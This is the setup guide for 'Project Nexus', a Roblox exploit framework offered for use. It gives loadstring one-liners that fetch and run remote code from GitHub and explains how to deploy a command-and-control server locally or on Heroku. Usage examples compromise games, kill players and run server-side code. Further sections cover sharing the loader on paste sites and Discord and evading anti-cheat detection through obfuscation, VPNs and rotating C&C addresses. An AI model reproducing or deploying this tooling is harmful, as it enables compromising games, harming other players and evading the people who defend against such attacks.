# Project Nexus - GitHub Setup Guide

## Quick Setup (5 minutes)

### Step 1: Upload to GitHub

1. **Create new repository** on GitHub:
   - Name: `ProjectNexus` (or whatever you want)
   - Visibility: **Private** (recommended) or Public
   - Don't initialize with README (you already have one)

2. **Push code to GitHub**:
```bash
cd ProjectNexus
git init
git add .
git commit -m "Initial commit - Project Nexus v1.0"
git branch -M main
git remote add origin https://github.com/YOUR_USERNAME/ProjectNexus.git
git push -u origin main
```

### Step 2: Configure Repository Name

**IMPORTANT**: Edit these files and change `YOUR_USERNAME`:

**In `main.lua` (line 11):**
```lua
local GITHUB_REPO = "YOUR_USERNAME/ProjectNexus"  -- Change this!
```

**In `loader.lua` (line 17):**
```lua
local GITHUB_REPO = "YOUR_USERNAME/ProjectNexus"  -- Change this!
```

**Commit the changes:**
```bash
git add main.lua loader.lua
git commit -m "Update GitHub repo URLs"
git push
```

### Step 3: Test Loading

**Single-line load (recommended):**
```lua
loadstring(game:HttpGet("https://raw.githubusercontent.com/HyperCodez495/ProjectNexus-Roblox-Script/refs/heads/main/Nexus/ProjectNexus/loader.lua"))()
```

**Direct main load:**
```lua
loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/main.lua"))()
```

Replace `YOUR_USERNAME` with your actual GitHub username!

---

## C&C Server Setup (Optional)

If you want remote command & control:

### Local C&C Server

1. **Install Python dependencies:**
```bash
cd server
pip install -r ../requirements.txt
```

2. **Start server:**
```bash
python command_server.py
```

Server runs on `http://localhost:8080`

3. **Update config in `loader.lua`:**
```lua
serverUrl = "http://YOUR_IP:8080",  -- Use your actual IP
```

### Cloud C&C Server (Heroku/Railway/etc)

1. **Deploy `command_server.py` to cloud platform**
2. **Get your deployed URL** (e.g., `https://nexus-c2.herokuapp.com`)
3. **Update `loader.lua`:**
```lua
serverUrl = "https://nexus-c2.herokuapp.com",
```

---

## Usage Examples

### Basic Usage (No C&C)

Works without C&C server for local exploitation:

```lua
-- Load from GitHub
loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/loader.lua"))()

-- Wait for initialization
wait(3)

-- Access instance
local nexus = _G.NexusInstance

-- Scan game
local scan = nexus:ScanCurrentGame()
print("Rating:", scan.rating)

-- Try to compromise
if nexus:Compromise() then
    print("Compromised!")
    
    -- Execute commands
    nexus:Command("kill", "PlayerName")
    nexus:Execute([[print("Serverside!")]])
end
```

### Advanced Usage (With C&C)

1. **Start C&C server** (see above)
2. **Update loader.lua** with your C&C URL
3. **Commit and push changes**
4. **Load in game:**
```lua
loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/loader.lua"))()
```

Now you can control the game remotely via C&C API!

---

## Sharing Your Loader

### Public Share (Paste Sites)

Create a simple loadstring for others:

```lua
loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/loader.lua"))()
```

Post this to:
- Pastebin
- Rentry.co
- GitHub Gist
- Discord

### Private Share (Whitelist)

Add authentication to `loader.lua`:

```lua
local WHITELISTED_USERS = {
    ["Username1"] = true,
    ["Username2"] = true,
}

local player = game:GetService("Players").LocalPlayer
if not WHITELISTED_USERS[player.Name] then
    player:Kick("Not whitelisted")
    return
end
```

---

## Troubleshooting

### "HttpService is not enabled"

Executor needs HTTP capabilities. Most modern executors support this.

### "Failed to load module from GitHub"

1. Check your GitHub username in URLs
2. Make sure repository is **public** (or use GitHub token for private)
3. Verify files are in correct locations
4. Check raw GitHub URL in browser first

### "Connection to C&C failed"

1. Make sure C&C server is running
2. Check firewall isn't blocking port 8080
3. Use public IP or cloud URL, not `localhost`
4. Test C&C health: `curl http://YOUR_IP:8080/health`

### "Compromise failed"

Game may not have exploitable vulnerabilities:
- Check scan results: `nexus:ScanCurrentGame()`
- Try manual injection: `nexus:Compromise("inject")`
- Look for manual backdoor opportunities

---

## Security Notes

### For Private Use

Keep repository **private** to prevent:
- Detection by anti-cheat developers
- Signature-based blocking
- Public scrutiny

### For Public Release

If making public:
- Remove or obfuscate C&C server code
- Add rate limiting
- Include stronger obfuscation
- Add authentication/whitelist

### Operational Security

- Use VPN when operating C&C server
- Don't use main Roblox account for testing
- Rotate C&C server IPs regularly
- Monitor for detection/bans

---

## GitHub Repository Structure

```
ProjectNexus/
├── .gitignore
├── README.md
├── SETUP.md              ← You are here
├── requirements.txt
├── main.lua              ← Main entry point
├── loader.lua            ← Single-line loader
├── core/
│   ├── scanner.lua
│   ├── injector.lua
│   ├── executor.lua
│   └── connection.lua
├── server/
│   └── command_server.py
├── client/
│   └── gui.lua
└── examples/
    ├── basic_usage.lua
    └── advanced_injection.lua
```

---

## Next Steps

1. ✅ Upload to GitHub
2. ✅ Update repository URLs
3. ✅ Test loadstring
4. ⬜ (Optional) Setup C&C server
5. ⬜ (Optional) Add whitelist
6. ⬜ Start using!

---

## Support

Issues? Check:
1. GitHub URLs are correct
2. Repository is public (or you have access)
3. Files are in right locations
4. Executor supports HTTP

For C&C issues:
1. Server is running
2. Firewall allows connections
3. Using correct IP/URL
4. Port 8080 is open

---

**Project Nexus** - GitHub deployment complete. Ship it.
